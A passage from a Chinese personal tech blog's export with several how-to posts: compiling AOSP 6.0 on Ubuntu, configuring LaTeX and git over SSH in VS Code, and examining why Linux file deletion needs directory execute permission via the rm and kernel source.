class="attr">&quot;beginsPattern&quot;</span>: <span class="string">&quot;.&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;endsPattern&quot;</span>: <span class="string">&quot;.&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>PS：将<code>.vscode</code>文件夹复制到其他LAB下即可直接使用</p>
<h3 id="下断点调试"><a href="#下断点调试" class="headerlink" title="下断点调试"></a>下断点调试</h3><p>在内核代码中下断点（如<code>kern/init/init.c</code>），然后按下F5即可进行调试<br>(如果调试时报错，并且是语法错误，选择<code>仍要调试</code>即可继续调试)</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/whileskies/p/13138491.html">ucore lab0 实验准备</a><br><a href="http://martin1994.sinaapp.com/archives/942">使用 VSCode 运行 Task 并自动 Attach Debugger</a><br><a href="https://stackoverflow.com/questions/44242048/how-to-make-vscode-not-wait-for-finishing-a-prelaunchtask">How to make vscode not wait for finishing a preLaunchTask?</a></p>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>VSCode</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 19.10 编译安卓6.0.0_r1源码</title>
    <url>/2019/12/29/ubuntu-1910-android-6-source/</url>
    <content><![CDATA[<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>[2020/04/16更新]<br>建议使用<code>docker</code>进行编译，省心省力<br>见：<a href="https://blog.xhyeax.com/2020/04/16/aosp-docker/">使用docker编译安卓源码</a></p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>之前编译了AOSP 5.1.1源码，没有写文章记录。这次记录一下编译安卓6.0.0_r1的过程，流程跟编译5.1.1大致一样</p>
<span id="more"></span>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="配置软件源"><a href="#配置软件源" class="headerlink" title="配置软件源"></a>配置软件源</h3><p><code>sudo vim /etc/apt/sources.list</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://archive.ubuntu.com/ubuntu/ trusty main universe restricted multiverse</span><br></pre></td></tr></table></figure>
<h3 id="启动i386架构"><a href="#启动i386架构" class="headerlink" title="启动i386架构"></a>启动i386架构</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br></pre></td></tr></table></figure>
<h3 id="更新软件源"><a href="#更新软件源" class="headerlink" title="更新软件源"></a>更新软件源</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
<h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><h4 id="程序包"><a href="#程序包" class="headerlink" title="程序包"></a>程序包</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y git flex bison gperf build-essential libncurses5-dev:i386 \</span><br><span class="line">libx11-dev:i386 libreadline6-dev:i386 libgl1-mesa-dev g++-multilib \</span><br><span class="line">tofrodos python-markdown libxml2-utils xsltproc zlib1g-dev:i386 \</span><br><span class="line">dpkg-dev libsdl1.2-dev libesd0-dev \</span><br><span class="line">git-core gnupg flex bison gperf build-essential \</span><br><span class="line">zip curl zlib1g-dev gcc-multilib g++-multilib \</span><br><span class="line">libc6-dev-i386 \</span><br><span class="line">lib32ncurses5-dev x11proto-core-dev libx11-dev \</span><br><span class="line">lib32z-dev ccache \</span><br><span class="line">libgl1-mesa-dev libxml2-utils xsltproc unzip m4</span><br></pre></td></tr></table></figure>
<h4 id="JDK"><a href="#JDK" class="headerlink" title="JDK"></a>JDK</h4><p>官网查询得知，编译安卓5.x-6.0都是使用JDK7<br>下载地址： <a href="https://pan.baidu.com/s/1AcnT-D9x8EE0Z6Jzuxgscw">https://pan.baidu.com/s/1AcnT-D9x8EE0Z6Jzuxgscw</a> 提取码: hqh5<br>将openJDK7解压到<code>/usr/lib/jvm</code>目录下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /usr/lib/jvm</span><br><span class="line">tar xvf openjdk-1.7.0_121.tar.xz -C /usr/lib/jvm/</span><br></pre></td></tr></table></figure>
<p>最终文件夹名为<code>/usr/lib/jvm/openjdk-1.7.0_121</code></p>
<p>修改<code>/etc/profile</code>文件，在末尾添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export JAVA_HOME=/usr/lib/jvm/openjdk-1.7.0_121</span><br><span class="line">export JRE_HOME=$&#123;JAVA_HOME&#125;/jre</span><br><span class="line">export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib</span><br><span class="line">export PATH=$&#123;JAVA_HOME&#125;/bin:$PATH</span><br></pre></td></tr></table></figure>
<p>之后执行<code>source /etc/profile</code>，从而免重启使环境变量在当前bash环境下生效，<br>然后执行以下命令测试java是否正常：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -version</span><br><span class="line">javac -version</span><br></pre></td></tr></table></figure>
<h3 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h3><p>有两种选择，直接下载压缩包或者使用repo下载</p>
<h4 id="下载压缩包"><a href="#下载压缩包" class="headerlink" title="下载压缩包"></a>下载压缩包</h4><p><a href="http://pan.baidu.com/s/1ngsZs">http://pan.baidu.com/s/1ngsZs</a></p>
<h4 id="使用repo下载"><a href="#使用repo下载" class="headerlink" title="使用repo下载"></a>使用repo下载</h4><p>repo可使用中科大版本或清华版本<br><a href="https://lug.ustc.edu.cn/wiki/mirrors/help/aosp">ustc - AOSP(Android) 镜像使用帮助</a><br><a href="https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/">tuna - AOSP(Android) 镜像使用帮助</a><br>以清华源为例<br><code>~/.bashrc</code>添加以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export REPO_URL=&#x27;https://mirrors.tuna.tsinghua.edu.cn/git/git-repo/</span><br></pre></td></tr></table></figure>
<p>再执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir aosp</span><br><span class="line">cd aosp</span><br><span class="line">## 创建工作文件夹，并初始化repo</span><br><span class="line">repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-6.0.0_r1 --depth=1</span><br><span class="line">## 指定深度和分支，只下载对应版本的代码，不下载commit记录</span><br><span class="line">repo sync</span><br><span class="line">## 同步源码树</span><br></pre></td></tr></table></figure>
<h3 id="下载驱动文件"><a href="#下载驱动文件" class="headerlink" title="下载驱动文件"></a>下载驱动文件</h3><p>在<a href="https://developers.google.com/android/drivers">官网</a>找到对应型号和版本的驱动，并解压到源码目录下<br>然后逐一运行解压出的脚本，读到第8条第e项之后输入<code>I ACCEPT</code>解压出驱动</p>
<h3 id="编译前准备"><a href="#编译前准备" class="headerlink" title="编译前准备"></a>编译前准备</h3><h4 id="修改mk文件"><a href="#修改mk文件" class="headerlink" title="修改mk文件"></a>修改mk文件</h4><p>修改 <code>art/build/Android.common_build.mk</code>文件，定位到75行<br>将<br><code>ifneq ($(WITHOUT_HOST_CLANG),true)</code><br>改为<br><code>ifeq ($(WITHOUT_HOST_CLANG),false)</code></p>
<h4 id="切换python版本"><a href="#切换python版本" class="headerlink" title="切换python版本"></a>切换<code>python</code>版本</h4><p>如果python默认版本为<code>python2</code>，则不需要进行这一步</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/python python /usr/bin/python2.7 1</span><br><span class="line">sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.6 2</span><br><span class="line">sudo update-alternatives --config python</span><br></pre></td></tr></table></figure>
<p>选择<code>python2</code>的序号并回车</p>
<h4 id="使用ccache"><a href="#使用ccache" class="headerlink" title="使用ccache"></a>使用ccache</h4><p>为提高编译效率，使用ccache加速编译<br>(1) 在<code>~/.bashrc</code>文件末尾添加：<code>export USE_CCACHE=1</code><br>(2) 在源码目录执行：<br><code>prebuilts/misc/linux-x86/ccache/ccache -M 100G</code><br>PS：据说<em>该设置会保存到CCACHE_DIR中，且该命令是长效的，不会因系统重启而失效。</em><br>但是可能因为其他原因失效，导致不使用ccache编译，所以建议每次编译前手动设置一下</p>
<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>执行<code>export LC_ALL=C</code><br>然后导入编译Android源码所需的环境:<br><code>source build/envsetup.sh</code><br>执行<code>lunch</code>选择编译目标<br><code>make -j26</code> 多线程编译，建议设置线程数为cpu核心数的2倍（<code>grep ^processor /proc/cpuinfo | wc -l</code>查看）</p>
<p>耐心等待编译完成</p>
<h3 id="刷入"><a href="#刷入" class="headerlink" title="刷入"></a>刷入</h3><p>在<code>out/target/product/型号</code>下找到生成的镜像，fastboot刷入即可</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://bbs.pediy.com/thread-254834.htm">Ubuntu 18.04.3 LTS 编译安卓6.0.0_r1</a><br><a href="https://blog.csdn.net/weixin_41572450/article/details/90257995">E:Unable to locate package libssl-dev:i386</a><br><a href="https://blog.csdn.net/weixin_34248258/article/details/86028896">ubuntu18.04无法安装libesd0-dev【学习笔记】</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>VS Code 配置LaTeX环境（MikTex）</title>
    <url>/2019/09/14/vscode-latex/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>之前都是用VNote编辑LaTeX公式，看到网上有人使用VS Code来编辑，故也来折腾一下。</p>
<h2 id="安装MikTex"><a href="#安装MikTex" class="headerlink" title="安装MikTex"></a>安装MikTex</h2><p><a href="https://miktex.org/">MikTex官网</a>下载，安装，然后以管理员身份运行<code>MiKTeX Console</code>（可以在开始菜单中搜索）<br>PS: 先不安装拓展包，等编译时自然会提示安装</p>
<span id="more"></span>
<h2 id="配置VS-Code"><a href="#配置VS-Code" class="headerlink" title="配置VS Code"></a>配置VS Code</h2><p>安装<code>Latex workshop</code>和<code>LaTeX language support</code>拓展<br>新建<code>.vscode</code>文件夹，创建<code>settings.json</code>，写入以下内容：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;latex-workshop.latex.recipes&quot;</span>: [&#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;xelatex&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;tools&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;xelatex&quot;</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;latexmk&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;tools&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;latexmk&quot;</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;pdflatex -&gt; bibtex -&gt; pdflatex*2&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;tools&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;pdflatex&quot;</span>,</span><br><span class="line">        <span class="string">&quot;bibtex&quot;</span>,</span><br><span class="line">        <span class="string">&quot;pdflatex&quot;</span>,</span><br><span class="line">        <span class="string">&quot;pdflatex&quot;</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;latex-workshop.latex.tools&quot;</span>: [&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;latexmk&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;latexmk&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;args&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;-synctex=1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-interaction=nonstopmode&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-file-line-error&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-pdf&quot;</span>,</span><br><span class="line">    <span class="string">&quot;%DOC%&quot;</span></span><br><span class="line">  ]</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;xelatex&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;xelatex&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;args&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;-synctex=1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-interaction=nonstopmode&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-file-line-error&quot;</span>,</span><br><span class="line">    <span class="string">&quot;%DOC%&quot;</span></span><br><span class="line">  ]</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;pdflatex&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;pdflatex&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;args&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;-synctex=1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-interaction=nonstopmode&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-file-line-error&quot;</span>,</span><br><span class="line">    <span class="string">&quot;%DOC%&quot;</span></span><br><span class="line">  ]</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;bibtex&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;bibtex&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;args&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;%DOCFILE%&quot;</span></span><br><span class="line">  ]</span><br><span class="line">  &#125;],</span><br><span class="line">  <span class="attr">&quot;latex-workshop.view.pdf.viewer&quot;</span>: <span class="string">&quot;tab&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;latex-workshop.latex.clean.fileTypes&quot;</span>: [</span><br><span class="line">  <span class="string">&quot;*.aux&quot;</span>,</span><br><span class="line">  <span class="string">&quot;*.bbl&quot;</span>,</span><br><span class="line">  <span class="string">&quot;*.blg&quot;</span>,</span><br><span class="line">  <span class="string">&quot;*.idx&quot;</span>,</span><br><span class="line">  <span class="string">&quot;*.ind&quot;</span>,</span><br><span class="line">  <span class="string">&quot;*.lof&quot;</span>,</span><br><span class="line">  <span class="string">&quot;*.lot&quot;</span>,</span><br><span class="line">  <span class="string">&quot;*.out&quot;</span>,</span><br><span class="line">  <span class="string">&quot;*.toc&quot;</span>,</span><br><span class="line">  <span class="string">&quot;*.acn&quot;</span>,</span><br><span class="line">  <span class="string">&quot;*.acr&quot;</span>,</span><br><span class="line">  <span class="string">&quot;*.alg&quot;</span>,</span><br><span class="line">  <span class="string">&quot;*.glg&quot;</span>,</span><br><span class="line">  <span class="string">&quot;*.glo&quot;</span>,</span><br><span class="line">  <span class="string">&quot;*.gls&quot;</span>,</span><br><span class="line">  <span class="string">&quot;*.ist&quot;</span>,</span><br><span class="line">  <span class="string">&quot;*.fls&quot;</span>,</span><br><span class="line">  <span class="string">&quot;*.log&quot;</span>,</span><br><span class="line">  <span class="string">&quot;*.fdb_latexmk&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>重启<code>VS Code</code></p>
<h2 id="首次编译tex文件"><a href="#首次编译tex文件" class="headerlink" title="首次编译tex文件"></a>首次编译tex文件</h2><p>重启<code>VS Code</code>后，创建后缀为<code>.tex</code>的文件，写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\documentclass[UTF8]&#123;ctexart&#125;</span><br><span class="line">    \usepackage&#123;ctex&#125;</span><br><span class="line">\begin&#123;document&#125;</span><br><span class="line">你好，World!</span><br><span class="line">\end&#123;document&#125;</span><br></pre></td></tr></table></figure>
<p>点击左边的TEX图标，选择<code>Build LaTeX project</code>，<code>Recipe</code>任选一个进行编译。<br>这时<code>MiKTeX Console</code>就会弹出安装拓展包的请求，逐一安装即可。<br>之后新建其他文件后，也需要手动选择<code>Build LaTeX project</code>进行编译</p>
<h2 id="预览"><a href="#预览" class="headerlink" title="预览"></a>预览</h2><p>右上角有个小图标，点击即可预览。（快捷键<code>Ctrl+Alt+V</code>）</p>
<h2 id="即时预览"><a href="#即时预览" class="headerlink" title="即时预览"></a>即时预览</h2><p>两个窗口都处于打开状态时可以即时预览<br>注意：需要保存(<code>Ctrl+S</code>)文件后才会更新pdf。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/yinqingwang/article/details/79684419">论文写作的又一利器：VSCode + Latex Workshop + MikTex + Git</a><br><a href="https://www.jianshu.com/p/538856b3e5c0">Visual Studio Code 编辑 LaTex 入门 （一）</a></p>
]]></content>
      <tags>
        <tag>VSCode</tag>
        <tag>LaTeX</tag>
      </tags>
  </entry>
  <entry>
    <title>VSCode中配置git使用ssh连接</title>
    <url>/2020/04/13/vscode-git-by-ssh/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>使用HTTPS协议时需要输入账号密码，比较麻烦，虽然可以配置自动保存密码，但明文保存可能导致安全性的降低。<br>在部署博客时也收到了github的邮件提醒：</p>
<blockquote>
<p>On July 1st, 2020, basic authentication using password to this endpoint will no longer work</p>
</blockquote>
<p>故决定使用ssh密钥连接git</p>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="安装git-bash"><a href="#安装git-bash" class="headerlink" title="安装git bash"></a>安装git bash</h3><p><a href="https://gitforwindows.org/">https://gitforwindows.org/</a></p>
<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>打开<code>git bash</code>，配置用户名和邮箱：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.name author</span><br><span class="line">git config --global user.email author@gmail.com</span><br></pre></td></tr></table></figure>
<h3 id="生成ssh-key"><a href="#生成ssh-key" class="headerlink" title="生成ssh key"></a>生成ssh key</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;author@gmail.com&quot;</span><br></pre></td></tr></table></figure>
<p>回车设置为默认路径，然后输入两次密码（直接回车则密码为空）</p>
<h3 id="在github中添加ssh-key"><a href="#在github中添加ssh-key" class="headerlink" title="在github中添加ssh key"></a>在github中添加ssh key</h3><p>打开<a href="https://github.com/settings/keys">https://github.com/settings/keys</a><br>将<code>id_rsa.pub</code>内容填入即可</p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>
<p>输入密码验证，返回正确则说明配置完成。</p>
<h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><p>之后都使用git协议来克隆仓库<br>如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone git@github.com:XhyEax/LeetCode.git</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/eliot2877/article/details/77841226">vscode中利用git通过ssh连接github</a><br><a href="https://blog.csdn.net/qq_39669916/article/details/82974970">git-ssh-config.md</a></p>
]]></content>
      <tags>
        <tag>VSCode</tag>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>VSCode中git设置保存密码</title>
    <url>/2020/04/13/vscode-git-save-pwd/</url>
    <content><![CDATA[<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>在终端中执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global credential.helper store</span><br></pre></td></tr></table></figure>
<p>然后重新打开VSCode</p>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>这样配置的话，会在用户目录下生成<code>.git-credentials</code>文件，明文保存账号密码。<br>PS: 用户目录（Windows: <code>C:/User/UserName</code>，Linux: <code>~</code>）</p>
<h2 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h2><p>编辑<code>.gitconfig</code>，删除以下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[credential]</span><br><span class="line">    helper = store</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/8854713433c5">vscode git提交总让输入用户名及密码</a></p>
]]></content>
      <tags>
        <tag>VSCode</tag>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>为什么Linux删除文件需要文件夹的可执行权限</title>
    <url>/2021/08/25/why-linux-rm-dirfile-need-x/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在Linux系统中，需要对文件所在目录有读写权限和可执行权限，才可以删除文件。读写权限很好理解，因为需要读取和修改文件夹内容信息。而可执行权限感觉有点奇怪，谷歌+分析内核源码，得到答案。</p>
<span id="more"></span>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>注意：需要使用普通用户进行以下操作</p>
<p>首先使用<code>mkdir</code>创建一个目录，查看其权限，为<code>drwxr-xr-x</code>(755)<br>然后在该目录下创建文件，查看权限为<code>-rw-r--r--</code>(644)<br>可以看到文件夹和文件的默认权限是不同的，文件夹具有可执行权限</p>
<p>使用chmod命令设置文件夹权限为600，使用<code>ls</code>命令列出文件，或者<code>rm</code>直接删除文件，都提示权限不足。（要删除的话首先要列出文件，合理）</p>
<p>使用chmod命令设置文件夹权限为100，使用<code>cd</code>命令（通过<code>chdir</code>这一系统调用），正常打开该目录，但无法列出文件。</p>
<p>由此可知，<code>chdir</code>仅检测可执行权限，不检测读权限。而列出文件则需要读和可执行权限。</p>
<p>r：列出文件夹下的文件名（其他信息则需要x）<br>x：切换该目录为工作目录</p>
<h2 id="探究"><a href="#探究" class="headerlink" title="探究"></a>探究</h2><h3 id="为什么需要可执行权限"><a href="#为什么需要可执行权限" class="headerlink" title="为什么需要可执行权限"></a>为什么需要可执行权限</h3><p>见<a href="https://web.archive.org/web/20150108210426/http://content.hccfl.edu/pollock/aunix1/filepermissions.htm">Unix File and Directory Permissions and Modes</a></p>
<blockquote>
<p>Because directories are not used in the same way as regular files, the permissions work slightly (but only slightly) differently.  An attempt to list the files in a directory requires read permission for the directory, but not on the files within.  An attempt to add a file to a directory, delete a file from a directory, or to rename a file, all require write permission for the directory, but (perhaps surprisingly) not for the files within.  Execute permission doesn’t apply to directories (a directory can’t also be a program).  But that permission bit is reused for directories for other purposes.</p>
</blockquote>
<blockquote>
<p>Execute permission is needed on a directory to be able to cd into it (that is, to make some directory your current working directory).</p>
</blockquote>
<blockquote>
<p>Execute is needed on a directory to access the inode information of the files within.  You need this to search a directory to read the inodes of the files within.  For this reason the execute permission on a directory is often called search permission instead.</p>
</blockquote>
<blockquote>
<p>You can think of read and execute on directories this way:  directories are data files that hold two pieces of information for each file within, the file’s name and it’s inode number.  Read permission is needed to access the names of files in a directory.  Execute (a.k.a. search) permission is needed to access the inodes of files in a directory, if you already know the file’s name.</p>
</blockquote>
<p>文件夹的可执行权限被用于chdir，也用于访问目录内文件的inode信息（因此对于文件夹而言，可执行权限通常被称为搜索权限）</p>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><h4 id="rm源码"><a href="#rm源码" class="headerlink" title="rm源码"></a>rm源码</h4><p><code>rm</code>是<a href="https://www.gnu.org/software/coreutils/coreutils.html">GNU coreutils</a>里的一个命令，源码见：<br><a href="https://github.com/coreutils/coreutils/blob/00ea4bacf6063ccc125209d5186f8f2382c6f0d4/src/remove.c">remove.c</a><br>最终调用<code>excise</code>函数删除文件</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Remove the file system object specified by ENT.  IS_DIR specifies</span></span><br><span class="line"><span class="comment">   whether it is expected to be a directory or non-directory.</span></span><br><span class="line"><span class="comment">   Return RM_OK upon success, else RM_ERROR.  */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">enum</span> RM_status</span></span><br><span class="line"><span class="function"><span class="title">excise</span> <span class="params">(FTS *fts, FTSENT *ent, struct rm_options <span class="keyword">const</span> *x, <span class="keyword">bool</span> is_dir)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> flag = is_dir ? AT_REMOVEDIR : <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">unlinkat</span> (fts-&gt;fts_cwd_fd, ent-&gt;fts_accpath, flag) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (x-&gt;verbose)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span> ((is_dir</span><br><span class="line">                   ? _(<span class="string">&quot;removed directory %s\n&quot;</span>)</span><br><span class="line">                   : _(<span class="string">&quot;removed %s\n&quot;</span>)), <span class="built_in">quoteaf</span> (ent-&gt;fts_path));</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">return</span> RM_OK;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The unlinkat from kernels like linux-2.6.32 reports EROFS even for</span></span><br><span class="line"><span class="comment">     nonexistent files.  When the file is indeed missing, map that to ENOENT,</span></span><br><span class="line"><span class="comment">     so that rm -f ignores it, as required.  Even without -f, this is useful</span></span><br><span class="line"><span class="comment">     because it makes rm print the more precise diagnostic.  */</span></span><br><span class="line">  <span class="keyword">if</span> (errno == EROFS)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">      <span class="keyword">if</span> ( ! (<span class="built_in">lstatat</span> (fts-&gt;fts_cwd_fd, ent-&gt;fts_accpath, &amp;st)</span><br><span class="line">                       &amp;&amp; errno == ENOENT))</span><br><span class="line">        errno = EROFS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">ignorable_missing</span> (x, errno))</span><br><span class="line">    <span class="keyword">return</span> RM_OK;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When failing to rmdir an unreadable directory, we see errno values</span></span><br><span class="line"><span class="comment">     like EISDIR or ENOTDIR (or, on Solaris 10, EEXIST), but they would be</span></span><br><span class="line"><span class="comment">     meaningless in a diagnostic.  When that happens and the errno value</span></span><br><span class="line"><span class="comment">     from the failed open is EPERM or EACCES, use the earlier, more</span></span><br><span class="line"><span class="comment">     descriptive errno value.  */</span></span><br><span class="line">  <span class="keyword">if</span> (ent-&gt;fts_info == FTS_DNR</span><br><span class="line">      &amp;&amp; (errno == ENOTEMPTY || errno == EISDIR || errno == ENOTDIR</span><br><span class="line">          || errno == EEXIST)</span><br><span class="line">      &amp;&amp; (ent-&gt;fts_errno == EPERM || ent-&gt;fts_errno == EACCES))</span><br><span class="line">    errno = ent-&gt;fts_errno;</span><br><span class="line">  <span class="built_in">error</span> (<span class="number">0</span>, errno, _(<span class="string">&quot;cannot remove %s&quot;</span>), <span class="built_in">quoteaf</span> (ent-&gt;fts_path));</span><br><span class="line">  <span class="built_in">mark_ancestor_dirs</span> (ent);</span><br><span class="line">  <span class="keyword">return</span> RM_ERROR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到是通过<code>unlinkat</code>系统调用删除文件（也可使用<code>strace</code>跟踪系统调用）</p>
<h4 id="内核源码"><a href="#内核源码" class="headerlink" title="内核源码"></a>内核源码</h4><p><a href="https://github.com/torvalds/linux/blob/303392fd5c160822bf778270b28ec5ea50cab2b4/fs/namei.c">fs/namei.c</a></p>
<p>其中定义了<code>unlinkat</code>和<code>unlink</code>系统调用：</p>
